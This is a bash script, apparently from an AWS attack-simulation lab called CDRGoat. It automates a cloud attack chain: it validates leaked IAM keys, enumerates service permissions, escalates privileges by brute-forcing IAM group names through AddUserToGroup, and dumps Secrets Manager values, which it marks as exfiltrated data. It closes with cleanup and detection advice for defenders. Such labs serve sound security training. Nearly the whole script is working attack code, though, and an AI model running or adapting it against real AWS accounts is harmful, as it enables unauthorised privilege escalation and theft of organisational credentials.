#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \/ _ \/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

try() {
  local desc="$1"; shift
  local rc
  set +e
  "$@" >/dev/null 2>&1
  rc=$?
  set -e
  if [ $rc -eq 0 ]; then
    printf "[%s] %s[OK]%s    %s\n" "$(date +%H:%M:%S)" "$GREEN" "$RESET" "$desc"
  else
    printf "[%s] %s[DENY]%s  %s\n" "$(date +%H:%M:%S)" "$RED" "$RESET" "$desc"
  fi
}

is_valid_keys() {
  local key="$1" secret="$2" token="${3:-}" region="${4:-us-east-1}"
  local rc=0 out

  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_PROFILE AWS_DEFAULT_PROFILE
  PROFILE="streamgoat-scenario-4"

  aws configure set aws_access_key_id     "$key"    --profile "$PROFILE"
  aws configure set aws_secret_access_key "$secret" --profile "$PROFILE"
  aws configure set region                "$region" --profile "$PROFILE"

  spin_start "Validating credentials via STS"
  out=$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>&1) || rc=$?
  spin_stop

  if [ "$rc" -ne 0 ]; then
    return 1
  fi

  ok "STS OK → $(printf "%s" "$out" | jq -r '.Arn')"
  return 0
}

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===           CDRGoat AWS - Scenario 4               ===" "${RESET}"
  printf "%sLeaked Helpdesk Key → IAM Group Brute-force → Secret Exfiltration%s\n\n" "${GREEN}" "${RESET}"
  printf "This automated attack script will:\n"
  printf "  • Step 1. Configure leaked AWS credentials\n"
  printf "  • Step 2. Enumerate permissions for leaked credentials\n"
  printf "  • Step 3. IAM introspection and escalation discovery\n"
  printf "  • Step 4. Group name brute-force and privilege escalation\n"
  printf "  • Step 5. Dump secrets from Secrets Manager\n"
}
banner

#############################################
# Preflight checks
#############################################
step "Preflight checks"
missing=0
for c in aws jq; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true

#############################################
# Step 1. Configuring AWS credentials
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Configuring AWS credentials  ===" "${RESET}"

step "Starting point configuration"
while :; do
  read -r -p "Enter leaked AWS key: " AWSKEY_USER
  read -r -p "Enter leaked AWS secret: " AWSSECRET_USER; printf "\n"
  if is_valid_keys "$AWSKEY_USER" "$AWSSECRET_USER" "us-east-1"; then
    ok "Keys are valid. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} successful"
    break
  else
    err "Not valid keys. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} failed"
  fi
done
printf "\n"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We configured AWS CLI with leaked IAM user credentials.\n\n"
printf "This simulates credentials from a helpdesk or support user.\n"
printf "These accounts often have overlooked escalation paths.\n\n"
read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 2. Permission enumeration for leaked credentials
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for leaked credentials  ===" "${RESET}"

step "Identifying stolen identity"
spin_start "Calling STS GetCallerIdentity"
CALLER_ID="$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>/dev/null)"
spin_stop

if [ -n "$CALLER_ID" ]; then
  ok "Identity confirmed"
  printf "  • Account : %s%s%s\n" "$YELLOW" "$(echo "$CALLER_ID" | jq -r '.Account')" "$RESET"
  printf "  • ARN     : %s%s%s\n" "$YELLOW" "$(echo "$CALLER_ID" | jq -r '.Arn')" "$RESET"
  printf "  • UserId  : %s%s%s\n" "$YELLOW" "$(echo "$CALLER_ID" | jq -r '.UserId')" "$RESET"
fi

step "Probing permissions across AWS services"
try "IAM List Roles"        aws iam list-roles --profile "$PROFILE"
try "EC2 DescribeInstances" aws ec2 describe-instances --max-items 5 --profile "$PROFILE"
try "S3 ListAllMyBuckets"   aws s3api list-buckets --profile "$PROFILE"
try "Secrets ListSecrets"   aws secretsmanager list-secrets --max-results 5 --profile "$PROFILE"
try "SSM GetParametersByPath /" aws ssm get-parameters-by-path --path / --max-results 5 --profile "$PROFILE"
try "SSM DescribeInstances" aws ssm describe-instance-information --profile "$PROFILE"
try "KMS ListKeys"          aws kms list-keys --limit 5 --profile "$PROFILE"
try "ECR DescribeRepos"     aws ecr describe-repositories --max-results 5 --profile "$PROFILE"
try "Lambda ListFunctions"  aws lambda list-functions --max-items 5 --profile "$PROFILE"
try "DDB ListTables"        aws dynamodb list-tables --max-items 5 --profile "$PROFILE"
try "RDS DescribeDBs"       aws rds describe-db-instances --max-records 20 --profile "$PROFILE"
try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$PROFILE"
try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"

printf "\nPermissions are quite limited. Let's investigate our own IAM identity further...\n"
printf "\n"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "Most services returned [DENY] — this appears to be a restricted account.\n\n"
printf "When direct service access is limited, attackers focus on:\n"
printf "  • What IAM permissions does this user have?\n"
printf "  • What groups are they in?\n"
printf "  • Are there escalation paths through IAM itself?\n\n"
read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 3. IAM Introspection & Escalation Discovery
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. IAM introspection and escalation discovery  ===" "${RESET}"

step "Resolving current identity"
IDENTITY=$(aws sts get-caller-identity --profile "$PROFILE" --output json)

USER_ARN=$(echo "$IDENTITY" | jq -r '.Arn')
ACCOUNT_ID=$(echo "$IDENTITY" | jq -r '.Account')
USER_ID=$(echo "$IDENTITY" | jq -r '.UserId')
USER_NAME=$(basename "$USER_ARN")

ok "IAM User: ${YELLOW}${USER_NAME}${RESET}"
info "  ARN       : $USER_ARN"
info "  Account   : $ACCOUNT_ID"
info "  UserId    : $USER_ID"

step "Getting group memberships for user: ${YELLOW}${USER_NAME}${RESET}"
USER_GROUPS=$(aws iam list-groups-for-user --user-name "$USER_NAME" --profile "$PROFILE" | jq -r '.Groups[].GroupName')

if [ -z "$USER_GROUPS" ]; then
  err "No groups found for user $USER_NAME"
else
  ok "Found $(echo "$USER_GROUPS" | wc -l) group(s):"
  echo "$USER_GROUPS" | sed 's/^/  - /'
fi

for group in $USER_GROUPS; do
  step "Inspecting policies for group: ${CYAN}${group}${RESET}"

  INLINE_POLICIES=$(aws iam list-group-policies --group-name "$group" --profile "$PROFILE" | jq -r '.PolicyNames[]?')
  if [ -n "$INLINE_POLICIES" ]; then
    ok "Inline policies found:"
    for policy_name in $INLINE_POLICIES; do
      echo "  - $policy_name"
      aws iam get-group-policy --group-name "$group" --policy-name "$policy_name" --profile "$PROFILE" | jq '.PolicyDocument'
    done
  else
    info "No inline policies found on $group"
  fi

  MANAGED=$(aws iam list-attached-group-policies --group-name "$group" --profile "$PROFILE" | jq -r '.AttachedPolicies[].PolicyArn')

  if [ -n "$MANAGED" ]; then
    ok "Managed policies attached:"
    for policy_arn in $MANAGED; do
      echo "  - $policy_arn"
      VERSION_ID=$(aws iam get-policy --policy-arn "$policy_arn" --profile "$PROFILE" | jq -r '.Policy.DefaultVersionId')
      aws iam get-policy-version --policy-arn "$policy_arn" --version-id "$VERSION_ID" --profile "$PROFILE" | jq '.PolicyVersion.Document'
    done
  else
    info "No managed policies attached to $group"
  fi
done

step "Trying to enumerate all IAM groups"
try "IAM ListGroups" aws iam list-groups --profile "$PROFILE" --output json

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We discovered the user has ${MAGENTA}iam:AddUserToGroup${RESET} permission.\n\n"
printf "This allows self-promotion: if there's a more privileged group,\n"
printf "we can add ourselves to it and inherit those permissions.\n\n"
printf "Without iam:ListGroups, we cannot enumerate available groups.\n"
printf "However, we can brute-force by trying AddUserToGroup:\n"
printf "  • \"NoSuchEntity\" → Group doesn't exist\n"
printf "  • Success → Group exists AND we're now a member!\n\n"
read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 4. Group brute-force + privilege escalation
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Group name brute-force and privilege escalation  ===" "${RESET}"

# Extract suffix from known helpdesk group
KNOWN_GROUP=$(echo "$USER_GROUPS" | grep "helpdesk" | head -1)
GROUP_SUFFIX=$(echo "$KNOWN_GROUP" | sed 's/.*helpdesk-//')
GROUP_PREFIX="StreamGoat-aws4-Group"

GROUP_GUESSES=(
  "${GROUP_PREFIX}-finance-${GROUP_SUFFIX}"
  "${GROUP_PREFIX}-devops-${GROUP_SUFFIX}"
  "${GROUP_PREFIX}-admin-${GROUP_SUFFIX}"
  "${GROUP_PREFIX}-secretreaders-${GROUP_SUFFIX}"
  "${GROUP_PREFIX}-hr-${GROUP_SUFFIX}"
  "${GROUP_PREFIX}-data-${GROUP_SUFFIX}"
  "${GROUP_PREFIX}-auditors-${GROUP_SUFFIX}"
  "${GROUP_PREFIX}-infra-${GROUP_SUFFIX}"
  "${GROUP_PREFIX}-support-${GROUP_SUFFIX}"
  "${GROUP_PREFIX}-analytics-${GROUP_SUFFIX}"
)

step "Attempting to add ${YELLOW}${USER_NAME}${RESET} to guessed groups"

for group in "${GROUP_GUESSES[@]}"; do
  try "AddUserToGroup: $group" \
    aws iam add-user-to-group \
      --group-name "$group" \
      --user-name "$USER_NAME" \
      --profile "$PROFILE"
done

step "Re-checking group memberships after brute-force"

USER_GROUPS_JSON=$(aws iam list-groups-for-user --user-name "$USER_NAME" --profile "$PROFILE")
USER_GROUP_LIST=($(echo "$USER_GROUPS_JSON" | jq -r '.Groups[].GroupName'))

if [ "${#USER_GROUP_LIST[@]}" -eq 0 ]; then
  err "No groups found for user $USER_NAME"
else
  ok "Now a member of ${#USER_GROUP_LIST[@]} group(s):"
  for g in "${USER_GROUP_LIST[@]}"; do
    echo "  - $g"
  done
fi

# Derive TARGET_GROUP dynamically from newly joined groups
TARGET_GROUP=""
for g in "${USER_GROUP_LIST[@]}"; do
  if echo "$g" | grep -q "secretreaders"; then
    TARGET_GROUP="$g"
    break
  fi
done

if [ -z "$TARGET_GROUP" ]; then
  err "Could not find secretreaders group after brute-force"
  exit 1
fi

printf "\nSuccessfully joined ${YELLOW}${TARGET_GROUP}${RESET}.\n"
step "Inspecting policies for newly joined group: ${YELLOW}${TARGET_GROUP}${RESET}"

INLINE_POLICIES=$(aws iam list-group-policies --group-name "$TARGET_GROUP" --profile "$PROFILE" | jq -r '.PolicyNames[]?')

if [ -n "$INLINE_POLICIES" ]; then
  ok "Inline policies found:"
  for policy_name in $INLINE_POLICIES; do
    echo "  - $policy_name"
    aws iam get-group-policy --group-name "$TARGET_GROUP" --policy-name "$policy_name" --profile "$PROFILE" | jq '.PolicyDocument'
  done
else
  info "No inline policies found on $TARGET_GROUP"
fi

MANAGED_POLICIES=$(aws iam list-attached-group-policies --group-name "$TARGET_GROUP" --profile "$PROFILE" | jq -r '.AttachedPolicies[].PolicyArn')

if [ -n "$MANAGED_POLICIES" ]; then
  ok "Managed policies attached:"
  for policy_arn in $MANAGED_POLICIES; do
    echo "  - $policy_arn"
    VERSION_ID=$(aws iam get-policy --policy-arn "$policy_arn" --profile "$PROFILE" | jq -r '.Policy.DefaultVersionId')
    aws iam get-policy-version --policy-arn "$policy_arn" --version-id "$VERSION_ID" --profile "$PROFILE" | jq '.PolicyVersion.Document'
  done
else
  info "No managed policies attached to $TARGET_GROUP"
fi

printf "\n"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "Group name brute-force succeeded!\n\n"
printf "We joined ${MAGENTA}${TARGET_GROUP}${RESET} which grants:\n"
printf "  • ${MAGENTA}secretsmanager:ListSecrets${RESET}\n"
printf "  • ${MAGENTA}secretsmanager:GetSecretValue${RESET}\n\n"
printf "This is privilege escalation through IAM — we gained new\n"
printf "permissions without exploiting any service vulnerability.\n\n"
read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 5. Dumping secrets from Secrets Manager
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Dumping secrets from Secrets Manager  ===" "${RESET}"

step "Enumerating secrets"

SECRET_NAMES=($(aws secretsmanager list-secrets \
  --profile "$PROFILE" \
  --query "SecretList[?starts_with(Name, 'StreamGoat-aws4-')].Name" \
  --output text))

if [ "${#SECRET_NAMES[@]}" -eq 0 ]; then
  err "No secrets found with prefix 'StreamGoat-aws4-'"
else
  ok "Found ${#SECRET_NAMES[@]} secret(s):"
  for secret in "${SECRET_NAMES[@]}"; do
    echo "  - $secret"
  done
fi

step "Dumping secret values"

for secret in "${SECRET_NAMES[@]}"; do
  printf "\n%s%s[+] Dumping: %s%s\n" "${BOLD}" "${YELLOW}" "$secret" "${RESET}"
  VALUE=$(aws secretsmanager get-secret-value \
    --secret-id "$secret" \
    --profile "$PROFILE" \
    --query 'SecretString' \
    --output text 2>/dev/null)

  if [ -n "$VALUE" ]; then
    printf "\n%s%s%s\n" "${BOLD}${RED}" "EXFILTRATED DATA" "${RESET}"
    printf "%s\n" "---------------------------------------------------------------------"
    echo "$VALUE" | jq . || echo "$VALUE"
    printf "%s\n" "---------------------------------------------------------------------"
    ok "Dumped: $secret"
  else
    err "Failed to dump: $secret"
  fi
done

#############################################
# Cleanup — remove user from brute-forced group
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Cleanup — remove user from brute-forced group  ===" "${RESET}"
printf "Removing user from ${YELLOW}${TARGET_GROUP}${RESET} so Terraform can destroy cleanly\n\n"

if aws iam remove-user-from-group \
  --group-name "$TARGET_GROUP" \
  --user-name "$USER_NAME" \
  --profile "$PROFILE" 2>/dev/null; then
  ok "Removed $USER_NAME from $TARGET_GROUP"
else
  err "Failed to remove user from group (manual cleanup may be needed before terraform destroy)"
fi

################################################################################
# Final Summary
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"

printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
printf "  1. Validated leaked helpdesk user credentials\n"
printf "  2. Enumerated permissions (limited service access)\n"
printf "  3. Discovered iam:AddUserToGroup permission via IAM introspection\n"
printf "  4. Brute-forced group names via AddUserToGroup\n"
printf "  5. Joined %s\n" "$TARGET_GROUP"
printf "  6. Exfiltrated secrets from Secrets Manager\n\n"

printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
printf "  • Access to organization's secrets (database credentials)\n"
printf "  • IAM privilege escalation via group membership brute-force\n"
printf "  • Potential lateral movement using exfiltrated credentials\n\n"

printf "%s\n" "Defenders should monitor for:"
printf "  • AddUserToGroup events, especially self-additions\n"
printf "  • Repeated AddUserToGroup failures (brute-force indicator)\n"
printf "  • Secrets Manager GetSecretValue calls from unexpected identities\n"
printf "  • Group membership changes in CloudTrail\n\n"

read -r -p "Scenario successfully completed. Press Enter or Ctrl+C to exit" _ || true
